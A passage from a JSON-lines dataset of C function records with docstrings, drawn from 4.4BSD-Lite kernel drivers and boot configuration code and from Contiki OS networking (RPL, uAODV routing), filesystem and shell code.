str2hex(++pp, &v0val[0])) == ',' &&\n\t\t\t    *(pp = str2hex(++pp, &v0val[1])) == ',')\n\t\t\t\t(void)str2hex(++pp, &v0val[2]);\n\n\t\t\t/* Assume sbus0 */\n\t\t\tstrcpy(bp->name, \"sbus\");\n\t\t\tbp->val[0] = 0;\n\t\t\t++bp;\n\n\t\t\tif (cp[0] == 'l' && cp[1] == 'e') {\n\t\t\t\t/* le */\n\t\t\t\tstrcpy(bp->name, \"le\");\n\t\t\t\tbp->val[0] = -1;\n\t\t\t\tbp->val[1] = v0val[0];\n\t\t\t} else {\n\t\t\t\t/* sd or maybe st; assume espN */\n\t\t\t\tstrcpy(bp->name, \"esp\");\n\t\t\t\tbp->val[0] = -1;\n\t\t\t\tbp->val[1] = v0val[0];\n\n/* XXX map target 0 to 3, 3 to 0. Should really see how the prom is configed */\n#define CRAZYMAP(v) ((v) == 3 ? 0 : (v) == 0 ? 3 : (v))\n\n\t\t\t\t++bp;\n\t\t\t\tbp->name[0] = cp[0];\n\t\t\t\tbp->name[1] = cp[1];\n\t\t\t\tbp->name[2] = '\\0';\n\t\t\t\tbp->val[0] = CRAZYMAP(v0val[1]);\n\t\t\t\tbp->val[1] = v0val[2];\n\t\t\t}\n\t\t}\n\n\t\t/* Setup pointer to boot flags */\n\t\tcp = (*promvec->pv_v0bootargs)->ba_argv[1];\n\t\tif (cp == NULL || *cp != '-')\n\t\t\treturn;\n\t} else {\n\t\t/* Grab boot path */\n\t\tcp = *promvec->pv_v2bootargs.v2_bootpath;\n\t\twhile (cp != NULL && *cp == '/') {\n\t\t\t/* Step over '/' */\n\t\t\t++cp;\n\t\t\t/* Extract name */\n\t\t\tpp = bp->name;\n\t\t\twhile (*cp != '@' && *cp != '/' && *cp != '\\0')\n\t\t\t\t*pp++ = *cp++;\n\t\t\t*pp = '\\0';\n\n\t\t\tif (*cp == '@') {\n\t\t\t\tcp = str2hex(++cp, &bp->val[0]);\n\t\t\t\tif (*cp == ',')\n\t\t\t\t\tcp = str2hex(++cp, &bp->val[1]);\n\t\t\t}\n\t\t\t++bp;\n\t\t}\n\n\t\t/* Setup pointer to boot flags */\n\t\tcp = *promvec->pv_v2bootargs.v2_bootargs;\n\t\tif (cp == NULL)\n\t\t\treturn;\n\t\twhile (*cp != '-')\n\t\t\tif (*cp++ == '\\0')\n\t\t\t\treturn;\n\t}\n\tfor (;;) {\n\t\tswitch (*++cp) {\n\n\t\tcase '\\0':\n\t\t\treturn;\n\n\t\tcase 'a':\n\t\t\tboothowto |= RB_ASKNAME;\n\t\t\tbreak;\n\n\t\tcase 'b':\n\t\t\tboothowto |= RB_DFLTROOT;\n\t\t\tbreak;\n\n\t\tcase 'd':\t/* kgdb - always on zs\tXXX */\n#ifdef KGDB\n\t\t\tboothowto |= RB_KDB;\t/* XXX unused */\n\t\t\tkgdb_debug_panic = 1;\n\t\t\tkgdb_connect(1);\n#else\n\t\t\tprintf(\"kernel not compiled with KGDB\\n\");\n#endif\n\t\t\tbreak;\n\n\t\tcase 's':\n\t\t\tboothowto |= RB_SINGLE;\n\t\t\tbreak;\n\t\t}\n\t}\n}", "path": "sparc\\sparc\\autoconf.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n *  default parameter set\n */\n", "func_signal": "set_default_param()", "code": "{\n\tregister struct fbdev *cfb = consfb;\n\n\tfont_w = cfb->font_w;\n\tfont_h = cfb->font_h;\n\tchar_w = cfb->char_w;\n\tchar_h = cfb->char_h;\n\tscr_w  = cfb->scr_w;\n\tscr_h  = cfb->scr_h;\n\tch_pos = cfb->ch_pos;\n\tul_pos = cfb->ul_pos;\n\tx_ofst = cfb->x_offset;\n\ty_ofst = cfb->y_offset;\n\trit_m  = cfb->rit_m;\n\tbtm_m  = cfb->btm_m;\n\ta_dim_on = 1;\n\n\tfont_r1.extent.x = font_w;\n\tfont_r1.extent.y = font_h;\n\tfont_r2.extent.x = font_w * 2;\n\tfont_r2.extent.y = font_h;\n\tfont_len1 = (font_w + 0x0f) >> 4;\n\tfont_len2 = (font_w*2 + 0x0f) >> 4;\n\tchar_r1.extent.x = char_w;\n\tchar_r1.extent.y = char_h;\n\tchar_r2.extent.x = char_w * 2;\n\tchar_r2.extent.y = char_h;\n\n\tdim_cnt = DIM_CNT_DFLT;\n\tbell_len = BELL_LEN_DFLT;\n}", "path": "news3400\\bm\\vt100.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n * Entry Routine\n */\n", "func_signal": "bmdinit()", "code": "{\n\tregister struct bmd_softc *bp = &bmd_softc;\n\tregister struct bmd_linec *bq;\n\tregister int i;\n\n\tbp->bc_raddr = (char *) 0xB10C0008;\t\t/* plane-0 hardware address */\n\tbp->bc_waddr = (char *) 0xB1080008;\t\t/* common bitmap hardware address */\n\n\t/*\n\t *  adjust plane position\n\t */\n\n\tfb_adjust(7, -27);\n\n\tbp->bc_stat  = STAT_NORMAL;\n\n\tbp->bc_xmin  = 8;\n\tbp->bc_xmax  = 96;\n\tbp->bc_ymin  = 2;\n\tbp->bc_ymax  = 48;\n\n\tbp->bc_row = bp->bc_ymin;\n\n\tfor (i = bp->bc_ymin; i < bp->bc_ymax; i++) {\n\t\tbmd_linec[i].bl_next = &bmd_linec[i+1];\n\t\tbmd_linec[i].bl_prev = &bmd_linec[i-1];\n\t}\n\tbmd_linec[bp->bc_ymax-1].bl_next = &bmd_linec[bp->bc_ymin];\n\tbmd_linec[bp->bc_ymin].bl_prev = &bmd_linec[bp->bc_ymax-1];\n\n\tbq = bp->bc_bl = &bmd_linec[bp->bc_ymin];\n\tbq->bl_col = bq->bl_end = bp->bc_xmin;\n\n\tbp->bc_col = bp->bc_xmin;\n\n\tbp->bc_esc = &bp->bc_escseq[0];\n\tbp->bc_escape = bmd_escape;\n\n\tbmd_erase_screen((u_long *) bp->bc_waddr);\t/* clear screen */\n\n\t\t\t\t\t\t\t/* turn on  cursole */\n\tbmd_reverse_char(bp->bc_raddr,\n\t\t\t bp->bc_waddr,\n\t\t\t bq->bl_col, bp->bc_row);\n\n\tbmd_initflag = 1;\n}", "path": "luna68k\\dev\\bmd.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/* blitc */\n", "func_signal": "qdreset()", "code": "{ }\n\n/*\n *  INTERRUPT SERVICE ROUTINES\n */\n\n/*\n *  Service \"DMA DONE\" interrupt condition\n */\nqddint(qd)\n\tregister qd;\n{\n\tregister struct DMAreq_header *header;\n\tregister struct DMAreq *request;\n\tregister struct dga *dga;\n\tstruct adder *adder;\n\tint cookie;\t\t\t/* DMA adrs for QDSS */\n\n\t(void)spl4(); \t\t\t/* allow interval timer in */\n\n\t/*\n\t* init pointers \n\t*/\n\theader = DMAheader[qd]; \t    /* register for optimization */\n\tdga = (struct dga *) qdmap[qd].dga;\n\tadder = (struct adder *) qdmap[qd].adder;\n\n\t/*\n\t* if this interrupt flagged as bogus for interrupt flushing purposes.. \n\t*/\n\tif (DMA_ISIGNORE(header)) {\n\t\tDMA_CLRIGNORE(header);\n\t\treturn;\n\t}\n\n\t/*\n\t* dump a DMA hardware error message if appropriate\n\t*/\n\tif (dga->csr & DMA_ERR) {\n\n\t\tif (dga->csr & PARITY_ERR)\n\t\t    printf(\"qd%d: qddint: DMA hardware parity fault.\\n\", qd);\n\n\t\tif (dga->csr & BUS_ERR)\n\t\t    printf(\"qd%d: qddint: DMA hardware bus error.\\n\", qd);\n\t}\n\n\t/*\n\t* if this was a DMA from user space... \n\t*/\n\tif (qdflags[qd].user_dma) {\n\t\tqdflags[qd].user_dma = 0;\n\t\twakeup((caddr_t)&qdflags[qd].user_dma);\n\t\treturn;\n\t}\n\n\t/*\n\t* if we're doing DMA request queue services, field the error condition \n\t*/\n\tif (dga->csr & DMA_ERR) {\n\n\t\tdga->csr &= ~0x0600;\t\t/* halt DMA (reset fifo) */\n\t\tdga->csr |= DMA_ERR;\t\t/* clear error condition */\n\t\tadder->command = CANCEL;\t/* cancel adder activity */\n\n\t\tDMA_SETERROR(header);\t/* flag error in header status word */\n\t\tDMA_CLRACTIVE(header);\n\t\theader->DMAreq[header->oldest].DMAdone |= HARD_ERROR;\n\t\theader->newest = header->oldest;\n\t\theader->used = 0;\n\n\t\tif (qdrsel[qd] && qdflags[qd].selmask & SEL_WRITE) {\n\t\t\tselwakeup(qdrsel[qd], 0);\n\t\t\tqdrsel[qd] = 0;\n\t\t\tqdflags[qd].selmask &= ~SEL_WRITE;\n\t\t}\n\n\t\tif (dga->bytcnt_lo != 0) {\n\t\t\tdga->bytcnt_lo = 0;\n\t\t\tdga->bytcnt_hi = 0;\n\t\t\tDMA_SETIGNORE(header);\n\t\t}\n\t\treturn;\n\t}\n\n\t/*\n\t* if the DMA request queue is now becoming non-full, \n\t* wakeup \"select\" client.\n\t*/\n\tif (DMA_ISFULL(header)) {\n\t\tif (qdrsel[qd] && qdflags[qd].selmask & SEL_WRITE) {\n\t\t\tselwakeup(qdrsel[qd], 0);\n\t\t\tqdrsel[qd] = 0;\n\t\t\tqdflags[qd].selmask &= ~SEL_WRITE;\n\t\t}\n\t}\n\n\theader->DMAreq[header->oldest].DMAdone |= REQUEST_DONE;\n\tQDlast_DMAtype = header->DMAreq[header->oldest].DMAtype;\n\n\t/* check for unexpected interrupt */\n\tif (DMA_ISEMPTY(header))\n\t    return;\n\n\tDMA_GETEND(header);\t/* update request queue indices */\n\n\t/*\n\t* if no more DMA pending, wake up \"select\" client and exit \n\t*/\n\tif (DMA_ISEMPTY(header)) {\n\n\t\tif (qdrsel[qd] && qdflags[qd].selmask & SEL_WRITE) {\n\t\t\tselwakeup(qdrsel[qd], 0);\n\t\t\tqdrsel[qd] = 0;\n\t\t\tqdflags[qd].selmask &= ~SEL_WRITE;\n\t\t}\n\n\t\tDMA_CLRACTIVE(header);  /* flag DMA done */\n\t\treturn;\n\t}\n\n\t/*\n\t* initiate next DMA xfer  \n\t*/\n\trequest = DMA_GETBEGIN(header);\n\tif (request->DMAtype != QDlast_DMAtype) {\n\t\tdga->csr &= ~0x0600;\t  /* halt DMA (reset fifo) */\n\t\tadder->command = CANCEL;  /* cancel adder activity */\n\t}\n\n\n\tswitch (request->DMAtype) {\n\n\tcase DISPLIST:\n\t\tif (request->DMAtype != QDlast_DMAtype) {\n\t\t\tdga->csr |= DL_ENB;\n\t\t\tdga->csr &= ~(BTOP_ENB | BYTE_DMA);\n\t\t}\n\t\tbreak;\n\n\tcase PTOB:\n\t\tif (request->DMAtype != QDlast_DMAtype) {\n\t\t\tif (request->DMAdone & BYTE_PACK)\n\t\t\t    dga->csr |= (PTOB_ENB | BYTE_DMA);\n\t\t\telse {\n\t\t\t\tdga->csr |= PTOB_ENB;\n\t\t\t\tdga->csr &= ~BYTE_DMA;\n\t\t\t}\n\t\t}\n\t\tbreak;\n\n\tcase BTOP:\n\t\tif (request->DMAtype != QDlast_DMAtype) {\n\t\t\tif (request->DMAdone & BYTE_PACK) {\n\t\t\t\tdga->csr &= ~DL_ENB;\n\t\t\t\tdga->csr |= (BTOP_ENB | BYTE_DMA);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tdga->csr |= BTOP_ENB;\n\t\t\t\tdga->csr &= ~(BYTE_DMA | DL_ENB);\n\t\t\t}\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tprintf(\"qd%d: qddint: illegal DMAtype parameter.\\n\", qd);\n\t\tDMA_CLRACTIVE(header);\t/* flag DMA done */\n\t\treturn;\n\t}\n\n\tif (request->DMAdone & COUNT_ZERO) {\n\t\tdga->csr &= ~SET_DONE_FIFO;\n\t} \n\telse if (request->DMAdone & FIFO_EMPTY) {\n\t\tdga->csr |= SET_DONE_FIFO;\n\t}\n\n\tif (request->DMAdone & WORD_PACK)\n\t    dga->csr &= ~BYTE_DMA;\n\telse if (request->DMAdone & BYTE_PACK)\n\t    dga->csr |= BYTE_DMA;\n\n\tdga->csr |= DMA_IE;\n\tQDlast_DMAtype = request->DMAtype;\n\n\tcookie = ((int)request->bufp - (int)header) + (int)header->QBAreg;\n\n\tdga->adrs_lo = (short) cookie;\n\tdga->adrs_hi = (short) (cookie >> 16);\n\n\tdga->bytcnt_lo = (short) request->length;\n\tdga->bytcnt_hi = (short) (request->length >> 16);\n\n\treturn;\n}", "path": "vax\\uba\\qd.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n * Configure swap space and related parameters.\n */\n", "func_signal": "swapconf()", "code": "{\n\tregister struct swdevt *swp;\n\tregister int nblks;\n\n\tfor (swp = swdevt; swp->sw_dev != NODEV; swp++)\n\t\tif (bdevsw[major(swp->sw_dev)].d_psize) {\n\t\t\tnblks =\n\t\t\t  (*bdevsw[major(swp->sw_dev)].d_psize)(swp->sw_dev);\n\t\t\tif (nblks != -1 &&\n\t\t\t    (swp->sw_nblks == 0 || swp->sw_nblks > nblks))\n\t\t\t\tswp->sw_nblks = nblks;\n\t\t}\n}", "path": "sparc\\sparc\\autoconf.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/* DS5000_240 */\n", "func_signal": "static void\nkn02ba_errintr()", "code": "{\n\tregister int mer, adr, siz;\n\tstatic int errintr_cnt = 0;\n\n\tsiz = *(volatile int *)MACH_PHYS_TO_UNCACHED(KMIN_REG_MSR);\n\tmer = *(volatile int *)MACH_PHYS_TO_UNCACHED(KMIN_REG_MER);\n\tadr = *(volatile int *)MACH_PHYS_TO_UNCACHED(KMIN_REG_AER);\n\n\t/* clear interrupt bit */\n\t*(unsigned int *)MACH_PHYS_TO_UNCACHED(KMIN_REG_TIMEOUT) = 0;\n\n\terrintr_cnt++;\n\tprintf(\"(%d)%s%x [%x %x %x]\\n\", errintr_cnt,\n\t       \"Bad memory chip at phys \",\n\t       kn02ba_recover_erradr(adr, mer),\n\t       mer, siz, adr);\n}", "path": "pmax\\pmax\\trap.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n *  Bell\n */\n", "func_signal": "static\nbell()", "code": "{\n#ifdef news1800\n\tstatic int port;\n\n\tif (port == 0)\n\t\tport = port_create(\"port_cons_bell\");\n\tkbd_ioctl(port, KIOCBELL, &bell_len);\n#else\n\tkbd_ioctl(SCC_KEYBOARD, KIOCBELL, &bell_len);\n#endif\n\treturn (0);\n}", "path": "news3400\\bm\\vt100.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/* XXX: console tty struct for tprintf */\n", "func_signal": "cninit()", "code": "{\n\tregister struct consdev *cp;\n\n\t/*\n\t * Collect information about all possible consoles\n\t * and find the one with highest priority\n\t */\n\tfor (cp = constab; cp->cn_probe; cp++) {\n\t\t(*cp->cn_probe)(cp);\n\t\tif (cp->cn_pri > CN_DEAD &&\n\t\t    (cn_tab == NULL || cp->cn_pri > cn_tab->cn_pri))\n\t\t\tcn_tab = cp;\n\t}\n\t/*\n\t * No console, we can handle it\n\t */\n\tif ((cp = cn_tab) == NULL)\n\t\treturn;\n\t/*\n\t * Turn on console\n\t */\n\tcn_tty = cp->cn_tp;\n\t(*cp->cn_init)(cp);\n}", "path": "luna68k\\luna68k\\cons.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/************************************************************************/\n", "func_signal": "void\nrpl_ipv6_neighbor_callback(uip_ds6_nbr_t *nbr)", "code": "{\n  rpl_dag_t *dag;\n  rpl_parent_t *p;\n\n  /* This only handles one DODAG - if multiple we need to check all */\n  dag = rpl_get_dag(RPL_ANY_INSTANCE);\n  if(dag == NULL) {\n    return;\n  }\n\n  /* if this is our default route then clean the dag->def_route state */\n  if(dag->def_route != NULL &&\n     uip_ipaddr_cmp(&dag->def_route->ipaddr, &nbr->ipaddr)) {\n    dag->def_route = NULL;\n  }\n\n  if(!nbr->isused) {\n    PRINTF(\"RPL: Removing neighbor \");\n    PRINT6ADDR(&nbr->ipaddr);\n    PRINTF(\"\\n\");\n    p = rpl_find_parent(dag, &nbr->ipaddr);\n    if(p != NULL) {\n      p->rank = INFINITE_RANK;\n      /* Trigger DAG rank recalculation. */\n      p->updated = 1;\n    }\n  }\n}", "path": "core\\net\\rpl\\rpl.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\nsendto(const uip_ipaddr_t *dest, const void *buf, int len)", "code": "{\n  /* XXX: this is a HACK! We're updating the uIP UDP connection\n     \"unicastconn\" so that the destination address is the next-hop,\n     and we're patching the \"uip_udp_conn\" variable so that it points\n     the this connection instead. THIS IS NOT A NICE WAY TO DO THIS,\n     but it is currently nicer than the alternative (requesting a new\n     poll, and remembering the state, etc.). */\n  \n  uip_ipaddr_copy(&unicastconn->ripaddr, dest);\n  uip_udp_conn = unicastconn;\n  uip_udp_packet_send(unicastconn, buf, len);\n}", "path": "core\\net\\uaodv.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/************************************************************************/\n", "func_signal": "void\nrpl_init(void)", "code": "{\n  uip_ipaddr_t rplmaddr;\n  PRINTF(\"RPL started\\n\");\n\n  rpl_reset_periodic_timer();\n  neighbor_info_subscribe(rpl_link_neighbor_callback);\n\n  /* add rpl multicast address */\n  uip_create_linklocal_rplnodes_mcast(&rplmaddr);\n  uip_ds6_maddr_add(&rplmaddr);\n\n#if RPL_CONF_STATS\n  memset(&rpl_stats, 0, sizeof(rpl_stats));\n#endif\n}", "path": "core\\net\\rpl\\rpl.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "int\ncfs_read(int f, void *buf, unsigned int len)", "code": "{\n  if(f == 1) {\n    eeprom_read(CFS_EEPROM_OFFSET + file.fileptr, buf, len);\n    file.fileptr += len;\n    return len;\n  } else {\n    return -1;\n  }\n}", "path": "core\\cfs\\cfs-eeprom.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/* UIP_CONF_IPV6 */\n/*---------------------------------------------------------------------------*/\n", "func_signal": "PROCESS_THREAD(shell_ping_process, ev, data)", "code": "{\n  static struct etimer e;\n  struct shell_input *input;\n\n  PROCESS_BEGIN();\n\n  if(data == NULL) {\n    shell_output_str(&ping_command,\n\t\t     \"ping <server>: server as address\", \"\");\n    PROCESS_EXIT();\n  }\n  uiplib_ipaddrconv(data, &remoteaddr);\n  icmp6_new(NULL);\n\n  send_ping(&remoteaddr);\n  \n  running = 1;\n\n  while(running) {\n    etimer_set(&e, CLOCK_SECOND * 10);\n    \n    PROCESS_WAIT_EVENT();\n  \n#if UIP_CONF_IPV6\n    if(ev == tcpip_icmp6_event) {\n      switch(*((uint8_t *)data)){\n      case ICMP6_ECHO_REPLY:\n\tPRINTF(\"Echo reply received.\\n\");\n\tbreak;\n      default:\n\tPRINTF(\"Other ICMP6 message received.\\n\");\n      }\n    }\n#endif\n\n    if(etimer_expired(&e)) {\n      PROCESS_EXIT();      \n    }\n    \n    if(ev == shell_event_input) {\n      input = data;\n      if(input->len1 + input->len2 == 0) {\n\tPROCESS_EXIT();\n      }\n#if 0\n    } else if(ev == resolv_event_found) {\n      /* Either found a hostname, or not. */\n      if((char *)data != NULL &&\n\t resolv_lookup((char *)data) != NULL) {\n\tuip_ipaddr_copy(serveraddr, ipaddr);\n\ttelnet_connect(&s, server, serveraddr, nick);\n      } else {\n\tshell_output_str(&ping_command, \"Host not found.\", \"\");\n      }\n#endif /* 0 */\n    }\n  }\n\n  PROCESS_END();\n}", "path": "apps\\shell\\shell-ping.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\nsend_rerr(uip_ipaddr_t *addr, u32_t *seqno)", "code": "{\n  struct uaodv_msg_rerr *rm = (struct uaodv_msg_rerr *)uip_appdata;\n  \n  print_debug(\"send RERR for %d.%d.%d.%d\\n\", uip_ipaddr_to_quad(addr));\n\n  rm->type = UAODV_RERR_TYPE;\n  rm->reserved = 0;\n  rm->dest_count = 1;\n  uip_ipaddr_copy(&rm->unreach[0].addr, addr);\n  rm->unreach[0].seqno = *seqno;\n  if(*seqno == 0)\n    rm->flags = UAODV_RERR_UNKNOWN;\n  else\n    rm->flags = 0;\n\n  uip_udp_packet_send(bcastconn, rm, sizeof(struct uaodv_msg_rerr));\n}", "path": "core\\net\\uaodv.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "cfs_offset_t\ncfs_seek(int f, cfs_offset_t o, int w)", "code": "{\n  if(w == CFS_SEEK_SET && f == 1) {\n    file.fileptr = o;\n    return o;\n  } else {\n    return -1;\n  }\n}", "path": "core\\cfs\\cfs-eeprom.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\nhandle_incoming_packet(void)", "code": "{\n  struct uaodv_msg *m = (struct uaodv_msg *)uip_appdata;\n\n  /*  print_debug(\"New UDP data, AODV packet type %d\\n\", m->type);*/\n  switch(m->type) {\n  case UAODV_RREQ_TYPE:\n    handle_incoming_rreq();\n    break;\n\n  case UAODV_RREP_TYPE:\n    handle_incoming_rrep();\n    break;\n\n  case UAODV_RERR_TYPE:\n    handle_incoming_rerr();\n    break;\n  }\n\n}", "path": "core\\net\\uaodv.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "void\nshell_prompt(char *str)", "code": "{\n  printf(\"%d.%d: %s\", rimeaddr_node_addr.u8[RIMEADDR_SIZE - 2], rimeaddr_node_addr.u8[RIMEADDR_SIZE - 1],\n\t str);\n}", "path": "apps\\serial-shell\\serial-shell.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/************************************************************************/\n", "func_signal": "void\nrpl_remove_routes(rpl_dag_t *dag)", "code": "{\n  int i;\n\n  for(i = 0; i < UIP_DS6_ROUTE_NB; i++) {\n    if(uip_ds6_routing_table[i].state.dag == dag) {\n      uip_ds6_route_rm(&uip_ds6_routing_table[i]);\n    }\n  }\n}", "path": "core\\net\\rpl\\rpl.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\nhandle_incoming_rreq(void)", "code": "{\n  struct uaodv_msg_rreq *rm = (struct uaodv_msg_rreq *)uip_appdata;\n  uip_ipaddr_t dest_addr, orig_addr;\n  struct uaodv_rt_entry *rt, *fw = NULL;\n  \n  print_debug(\"RREQ %d.%d.%d.%d -> %d.%d.%d.%d ttl=%u\"\n\t      \" orig=%d.%d.%d.%d seq=%lu hops=%u dest=%d.%d.%d.%d seq=%lu\\n\",\n\t      uip_ipaddr_to_quad(&BUF->srcipaddr),\n\t      uip_ipaddr_to_quad(&BUF->destipaddr),\n\t      BUF->ttl,\n\t      uip_ipaddr_to_quad(&rm->orig_addr), uip_ntohl(rm->orig_seqno),\n\t      rm->hop_count,\n\t      uip_ipaddr_to_quad(&rm->dest_addr), uip_ntohl(rm->dest_seqno));\n\n  if(uip_ipaddr_cmp(&rm->orig_addr, &uip_hostaddr)) {\n    return;\t\t\t/* RREQ looped back! */\n  }\n\n#ifdef CC2420_RADIO\n {\n   int ret = cc2420_check_remote(uip_udp_sender()->u16[1]);\n\n   if(ret == REMOTE_YES) {\n     print_debug(\"RREQ drop is remote\\n\");\n     return;\n   } else if (ret == REMOTE_NO) {\n     /* Is neigbour, accept it. */\n   } else if(cc2420_last_rssi < RSSI_THRESHOLD) {\n     print_debug(\"RREQ drop %d %d\\n\", cc2420_last_rssi,\n\t\t cc2420_last_correlation);\n     return;\n   }\n }\n#endif\n\n#ifdef AODV_BAD_HOP_EXTENSION\n  if(uip_len > (sizeof(*rm) + 2)) {\n    struct uaodv_bad_hop_ext *ext = (void *)(uip_appdata + sizeof(*rm));\n    u8_t *end = uip_appdata + uip_len;\n    for(;\n\t(u8_t *)ext < end;\n\text = (void *)((u8_t *)ext + ext->length + 2)) {\n      u8_t *eend = (u8_t *)ext + ext->length;\n      if(eend > end)\n\teend = end;\n\n      if(ext->type == RREQ_BAD_HOP_EXT) {\n\tuip_ipaddr_t *a;\n\tfor(a = ext->addrs; (u8_t *)a < eend; a++) {\n\t  if(uip_ipaddr_cmp(a, &uip_hostaddr)) {\n\t    print_debug(\"BAD_HOP drop\\n\");\n\t    return;\n\t  }\n\t}\n      }\n    }\n  }\n#endif /* AODV_BAD_HOP_EXTENSION */\n\n  /* New reverse route? */\n  rt = uaodv_rt_lookup(&rm->orig_addr);\n  if(rt == NULL\n     || (SCMP32(uip_ntohl(rm->orig_seqno), rt->hseqno) > 0) /* New route. */\n     || (SCMP32(uip_ntohl(rm->orig_seqno), rt->hseqno) == 0\n\t && rm->hop_count < rt->hop_count)) { /* Better route. */\n    print_debug(\"Inserting1\\n\");\n    rt = uaodv_rt_add(&rm->orig_addr, uip_udp_sender(),\n\t\t      rm->hop_count, &rm->orig_seqno);\n  }\n    \n  /* Check if it is for our address or a fresh route. */\n  if(uip_ipaddr_cmp(&rm->dest_addr, &uip_hostaddr)\n     || rm->flags & UAODV_RREQ_DESTONLY) {\n    fw = NULL;\n  } else {\n    fw = uaodv_rt_lookup(&rm->dest_addr);\n    if(!(rm->flags & UAODV_RREQ_UNKSEQNO)\n       && fw != NULL\n       && SCMP32(fw->hseqno, uip_ntohl(rm->dest_seqno)) <= 0) {\n      fw = NULL;\n    }\n  }\n\n  if (fw != NULL) {\n    u32_t net_seqno;\n\n    print_debug(\"RREQ for known route\\n\");\n    uip_ipaddr_copy(&dest_addr, &rm->dest_addr);\n    uip_ipaddr_copy(&orig_addr, &rm->orig_addr);\n    net_seqno = uip_htonl(fw->hseqno);\n    send_rrep(&dest_addr, &rt->nexthop, &orig_addr, &net_seqno,\n\t      fw->hop_count + 1);\n  } else if(uip_ipaddr_cmp(&rm->dest_addr, &uip_hostaddr)) {\n    u32_t net_seqno;\n\n    print_debug(\"RREQ for our address\\n\");\n    uip_ipaddr_copy(&dest_addr, &rm->dest_addr);\n    uip_ipaddr_copy(&orig_addr, &rm->orig_addr);\n\n    my_hseqno++;\n    if(!(rm->flags & UAODV_RREQ_UNKSEQNO)\n       && SCMP32(my_hseqno, uip_ntohl(rm->dest_seqno)) < 0) {\n      print_debug(\"New my_hseqno %lu\\n\", my_hseqno); /* We have rebooted. */\n      my_hseqno = uip_ntohl(rm->dest_seqno) + 1;\n    }\n    net_seqno = uip_htonl(my_hseqno);\n    send_rrep(&dest_addr, &rt->nexthop, &orig_addr, &net_seqno, 0);\n  } else if(BUF->ttl > 1) {\n    int len;\n\n    /* Have we seen this RREQ before? */\n    if(fwc_lookup(&rm->orig_addr, &rm->rreq_id)) {\n      print_debug(\"RREQ cached, not fwd\\n\");\n      return;\n    }\n    fwc_add(&rm->orig_addr, &rm->rreq_id);\n\n    print_debug(\"RREQ fwd\\n\");\n    rm->hop_count++;\n    bcastconn->ttl = BUF->ttl - 1;\n    len = sizeof(struct uaodv_msg_rreq);\n    len += add_rreq_extensions(rm + 1);\n    uip_udp_packet_send(bcastconn, rm, len);\n  }\n}", "path": "core\\net\\uaodv.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/* In network byte order! */\n", "func_signal": "void\nuaodv_bad_dest(uip_ipaddr_t *dest)", "code": "{\n  struct uaodv_rt_entry *rt = uaodv_rt_lookup_any(dest);\n\n  if(rt == NULL)\n    bad_seqno = 0;\t\t/* Or flag this in RERR? */\n  else {\n    rt->is_bad = 1;\n    bad_seqno = uip_htonl(rt->hseqno);\n  }\n\n  uip_ipaddr_copy(&bad_dest, dest);\n  command = COMMAND_SEND_RERR;\n  process_post(&uaodv_process, PROCESS_EVENT_MSG, NULL);\n}", "path": "core\\net\\uaodv.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
